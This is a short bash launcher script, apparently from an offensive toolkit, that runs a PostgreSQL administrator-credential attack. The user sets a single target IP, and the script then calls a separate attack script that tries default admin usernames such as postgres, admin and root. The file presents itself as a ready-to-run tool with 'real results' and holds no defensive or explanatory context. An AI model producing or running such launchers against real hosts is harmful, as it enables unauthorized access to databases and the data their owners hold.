#!/bin/bash
# PostgreSQL Quick Attack - Just replace TARGET and run!
# One-line change, fully functional, real results

# ====== CHANGE THIS LINE ======
TARGET="192.168.1.100"
# ==============================

# Don't change anything below this line
cd "$(dirname "$0")/.."
echo "🎯 Starting PostgreSQL Attack on $TARGET..."
echo "📝 Using database admin credentials"
echo "👤 Trying: postgres, admin, pgadmin, root"
echo ""
bash scripts/postgres_admin_attack.sh -t "$TARGET" -v
